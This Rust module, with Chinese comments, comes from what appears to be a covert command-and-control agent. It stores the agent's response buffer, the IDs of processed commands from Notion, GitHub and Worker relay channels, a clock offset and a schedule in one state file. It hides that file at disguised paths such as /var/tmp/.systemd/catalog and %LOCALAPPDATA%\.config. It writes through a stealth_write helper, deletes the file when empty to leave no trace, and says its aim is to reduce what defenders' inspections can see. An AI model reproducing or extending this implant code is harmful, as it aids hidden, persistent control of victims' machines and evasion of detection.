//! stor.rs — 单目录状态聚合（catalog v2，见 DEV_PLAN_13_ITEMS.md 第 I 项）。
//!
//! 蓝队建议把分散在 state 目录下约 7 个文件的状态聚合为 1–2 个文件，以缩小
//! 磁盘足迹与巡检信号面。本模块把三类易被盯上的状态并入原有的 catalog 文件
//! （原本只装离线响应缓冲）：
//!   - buffer          离线响应缓冲（原裸数组，v2 改为对象字段）
//!   - processed        Notion/Worker 命令去重集合（原独立 hwdb 文件）
//!   - clock_offset_secs 时钟漂移校准值（原仅内存，重启即丢失，v2 持久化）
//!   - schedule        内部调度表（见 schedule.rs；v2 引入）
//!
//! 路径不变（伪装延续）：root = /var/tmp/.systemd/catalog，
//! non-root = ~/.local/share/catalog，windows = %LOCALAPPDATA%\.config\catalog.json。
//! 仅在 bin 树声明本模块（SO/lib_entry 不做磁盘持久化）。
//!
//! 写入纪律：所有字段的唯一权威在内存（response_buffer / PROCESSED /
//! net::current_offset_secs / schedule::snapshot），persist() 从这些源装配
//! 完整文档再覆写文件 —— 不存在读-改-写竞争；空文档时删除文件，延续无痕。

use std::sync::{Mutex, OnceLock};
use super::BufferedResponse;

// ── 文档结构（catalog v2）───────────────────────────────────────────────────

#[derive(serde::Serialize, serde::Deserialize)]
pub struct CatalogDoc {
    /// 文档版本（2）。读取时兼容：裸数组 = v1 缓冲，对象 = v2。
    pub v: u32,
    #[serde(default)]
    pub buffer: Vec<BufferedResponse>,
    #[serde(default)]
    pub processed: Vec<String>,
    #[serde(default)]
    pub clock_offset_secs: Option<i64>,
    #[serde(default)]
    pub schedule: serde_json::Value,
    /// Worker 通道（D1 行 id）独立数字水位（M1 修复）：GitHub 评论号（十亿级）
    /// 与 D1 自增 id 不是同一空间，此前共用 random-seed 会跨模式互相污染——
    /// github→worker 迁移的机器会因残留巨水位而永久滤掉所有 worker 命令。
    #[serde(default)]
    pub worker_cursor: Option<u64>,
}

fn default_doc() -> CatalogDoc {
    CatalogDoc {
        v: 2,
        buffer: Vec::new(),
        processed: Vec::new(),
        clock_offset_secs: None,
        schedule: serde_json::Value::Null,
        worker_cursor: None,
    }
}

// ── 路径 ──────────────────────────────────────────────────────────────────────

pub fn catalog_path() -> String {
    #[cfg(windows)]
    {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Local\.config\catalog.json", username)
    }
    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            "/var/tmp/.systemd/catalog".to_string()
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
            format!("{}/.local/share/catalog", home)
        }
    }
}

/// 旧独立 hwdb（已处理命令去重）路径 —— 仅迁移用，v2 起不再写。
fn legacy_hwdb_path() -> String {
    #[cfg(windows)]
    {
        let username = whoami::username();
        format!(r"C:\Users\{}\AppData\Local\.config\hwdb.txt", username)
    }
    #[cfg(unix)]
    {
        let is_root = unsafe { libc::geteuid() == 0 };
        if is_root {
            "/var/tmp/.systemd/hwdb".to_string()
        } else {
            let home = std::env::var("HOME").unwrap_or_else(|_| "/var/tmp".to_string());
            format!("{}/.local/share/hwdb", home)
        }
    }
}

// ── 磁盘读写 ────────────────────────────────────────────────────────────────

fn read_doc_from_disk() -> CatalogDoc {
    let path = catalog_path();
    let content = match std::fs::read_to_string(&path) {
        Ok(s) if !s.trim().is_empty() => s,
        _ => return default_doc(),
    };
    // v2 对象
    if let Ok(doc) = serde_json::from_str::<CatalogDoc>(&content) {
        return doc;
    }
    // v1 裸数组（只装缓冲）——立即迁移为 v2 对象
    if let Ok(items) = serde_json::from_str::<Vec<BufferedResponse>>(&content) {
        let mut doc = default_doc();
        doc.buffer = items;
        let _ = write_doc(&doc);
        return doc;
    }
    // 彻底损坏：改名留证，按空文档继续
    let bak = format!("{}.bak", path);
    let _ = std::fs::rename(&path, &bak);
    default_doc()
}

fn write_doc(doc: &CatalogDoc) -> std::io::Result<()> {
    match serde_json::to_string(doc) {
        Ok(json) => super::stealth_write(&catalog_path(), json.as_bytes()),
        Err(e) => {
            crate::debug_log(&format!("stor serialization failed: {}", e));
            Err(std::io::Error::new(std::io::ErrorKind::Other, e))
        }
    }
}

// ── 内存权威（processed / worker_cursor）───────────────────────────────────

static PROCESSED: OnceLock<Mutex<std::collections::HashSet<String>>> = OnceLock::new();

fn processed_guard() -> &'static Mutex<std::collections::HashSet<String>> {
    PROCESSED.get_or_init(|| Mutex::new(std::collections::HashSet::new()))
}

static WORKER_CURSOR: OnceLock<Mutex<Option<u64>>> = OnceLock::new();

fn worker_cursor_guard() -> &'static Mutex<Option<u64>> {
    WORKER_CURSOR.get_or_init(|| Mutex::new(None))
}

/// Worker 通道数字水位（D1 行 id 空间；None = 尚未消费过任何 worker 命令）。
pub fn load_worker_cursor() -> Option<u64> {
    match worker_cursor_guard().lock() {
        Ok(g) => *g,
        Err(p) => *p.into_inner(),
    }
}

/// 推进 worker 水位并落盘（catalog 内聚合，不新增磁盘文件）。
pub fn save_worker_cursor(v: u64) {
    {
        let mut g = match worker_cursor_guard().lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        if *g == Some(v) {
            return; // 未变化不写盘
        }
        *g = Some(v);
    }
    persist();
}

/// D1 AUTOINCREMENT 被重建时的信号：since=0 探到的最大 id 仍小于本地高位水位。
/// cron 只留约 100 行最新，未重建时 max ≈ cursor，不会误触发。
pub fn d1_sequence_reset(probe_max_id: u64, cursor: u64) -> bool {
    cursor > 0 && probe_max_id > 0 && probe_max_id < cursor
}

/// 清零 worker 水位。调用时机：注册/重新注册成功之后——中继 D1 若被重建
/// （AUTOINCREMENT 从头计数），旧高位水位会把新命令全部滤掉且健康态下
/// 无任何错误信号（拉取返回空≠报错），agent 会无声变聋。清零后一次全量
/// 拉取（中继 cron 每方向仅留 100 行）由去重集 processed 兜底，不重放。
pub fn clear_worker_cursor() {
    {
        let mut g = match worker_cursor_guard().lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        if *g == None {
            return;
        }
        *g = None;
    }
    persist();
}

// ── 公开 API ─────────────────────────────────────────────────────────────────

/// 启动时一次性恢复全部 catalog 状态（bin 侧；SO 不调用）。
/// 幂等：重复调用只重复写入同样的内存值，无副作用。
pub fn init_persistence() {
    let doc = read_doc_from_disk();

    // 1. 缓冲 → response_buffer（限 256 条，与旧 load_buffer_from_disk 一致）
    if !doc.buffer.is_empty() {
        match super::response_buffer().lock() {
            Ok(mut buf) => {
                for item in &doc.buffer {
                    if buf.len() < 256 { buf.push_back(item.clone()); }
                }
                crate::debug_log(&format!("Loaded {} pending responses from disk", doc.buffer.len()));
            }
            Err(p) => { let mut buf = p.into_inner(); for item in &doc.buffer { if buf.len() < 256 { buf.push_back(item.clone()); } } }
        }
    }

    // 2. 时钟偏移 → net（重启后先按旧校准值工作，下次成功往返再校准）
    if let Some(v) = doc.clock_offset_secs {
        crate::net::set_offset_secs(v);
    }

    // 2b. worker 水位 → 内存权威（M1：与 GitHub 的 random-seed 完全分空间）
    if let Some(v) = doc.worker_cursor {
        let mut g = match worker_cursor_guard().lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        *g = Some(v);
    }

    // 3. 调度表 → schedule
    if !doc.schedule.is_null() {
        if let Some(obj) = doc.schedule.as_array() {
            if !obj.is_empty() {
                crate::schedule::restore_json(&doc.schedule.to_string());
            }
        }
    }

    // 4. 已处理去重 → 内存集；并迁移旧 hwdb 文件（并入后删除）。
    //    审计修复（bug#7）：迁移成功后立即 persist()——旧文件已删，若等到
    //    下一次变更才落盘，中间崩溃会把整个去重集丢掉（Notion/Worker 命令重放）。
    let mut migrated = false;
    {
        let mut s = match processed_guard().lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        for id in &doc.processed {
            s.insert(id.clone());
        }
        if s.is_empty() {
            let legacy = legacy_hwdb_path();
            if let Ok(content) = std::fs::read_to_string(&legacy) {
                for line in content.lines() {
                    let l = line.trim();
                    if !l.is_empty() { s.insert(l.to_string()); }
                }
                if !s.is_empty() {
                    migrated = true;
                    crate::debug_log("stor: migrated legacy hwdb into catalog");
                }
            }
        }
    }
    if migrated {
        if persist() {
            let _ = std::fs::remove_file(&legacy_hwdb_path());
        } else {
            crate::debug_log("stor: hwdb migrate persist failed, keeping legacy file");
        }
    }
}

/// 从当前内存权威装配完整文档并落盘（无缓冲/去重/偏移/调度时删除文件）。
/// 审计修复（bug#12）：读快照与写文件全程持一把专用锁——两个线程并发
/// persist 时，后完成者可能用较早的快照覆盖较新的状态（丢失更新）。
/// 现有调用链（buffer_response / mark_cmd_processed / schedule 回调 /
/// drain）在调用前都已释放各自的锁，这里不存在嵌套获取，无死锁风险。
pub fn persist() -> bool {
    static PERSIST_LOCK: OnceLock<Mutex<()>> = OnceLock::new();
    let _serial = match PERSIST_LOCK.get_or_init(|| Mutex::new(())).lock() {
        Ok(g) => g,
        Err(p) => p.into_inner(),
    };

    let mut doc = default_doc();

    match super::response_buffer().lock() {
        Ok(mut g) => doc.buffer = g.make_contiguous().to_vec(),
        Err(p) => doc.buffer = p.into_inner().make_contiguous().to_vec(),
    }

    match processed_guard().lock() {
        Ok(g) => {
            doc.processed = g.iter().map(|s| s.to_string()).collect();
        }
        Err(p) => {
            let g = p.into_inner();
            doc.processed = g.iter().map(|s| s.to_string()).collect();
        }
    }

    doc.clock_offset_secs = crate::net::current_offset_secs();
    doc.schedule = crate::schedule::snapshot_json()
        .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
        .unwrap_or(serde_json::Value::Null);
    doc.worker_cursor = match worker_cursor_guard().lock() {
        Ok(g) => *g,
        Err(p) => *p.into_inner(),
    };

    let empty = doc.buffer.is_empty()
        && doc.processed.is_empty()
        && doc.clock_offset_secs.is_none()
        && doc.schedule.is_null()
        && doc.worker_cursor.is_none();
    if empty {
        let _ = std::fs::remove_file(&catalog_path());
        return true;
    }
    if let Err(e) = write_doc(&doc) {
        crate::debug_log(&format!("stor save failed: {}", e));
        return false;
    }
    true
}

/// 已处理命令去重集合（替代旧 load_processed_cmd_ids）。
pub fn load_processed_cmd_ids() -> std::collections::HashSet<String> {
    match processed_guard().lock() {
        Ok(g) => g.iter().map(|s| s.to_string()).collect(),
        Err(p) => p.into_inner().iter().map(|s| s.to_string()).collect(),
    }
}

/// 追加命令 id（幂等，上限 500 条）；变更时写盘。
pub fn mark_cmd_processed(command_id: &str) {
    let mut g = match processed_guard().lock() {
        Ok(g) => g,
        Err(p) => p.into_inner(),
    };
    if g.contains(command_id) { return; }
    g.insert(command_id.to_string());
    const MAX_IDS: usize = 500;
    if g.len() > MAX_IDS {
        // 去掉最旧的（HashSet 无序；去重集合只需有界，不必保序）
        let mut n = g.len() - MAX_IDS;
        let mut remove: Vec<String> = Vec::new();
        for id in g.iter() {
            if n == 0 { break; }
            remove.push(id.clone());
            n -= 1;
        }
        for id in remove { g.remove(&id); }
    }
    drop(g);
    if !persist() {
        let mut g = match processed_guard().lock() {
            Ok(g) => g,
            Err(p) => p.into_inner(),
        };
        g.remove(command_id);
        crate::debug_log("stor: persist failed, rolled back mark_cmd_processed");
    }
}

#[cfg(test)]
mod tests {
    use super::d1_sequence_reset;

    #[test]
    fn d1_rebuild_when_probe_max_below_cursor() {
        assert!(d1_sequence_reset(5, 5000));
        assert!(!d1_sequence_reset(5000, 5000));
        assert!(!d1_sequence_reset(5001, 5000));
        assert!(!d1_sequence_reset(0, 5000));
        assert!(!d1_sequence_reset(5, 0));
    }
}
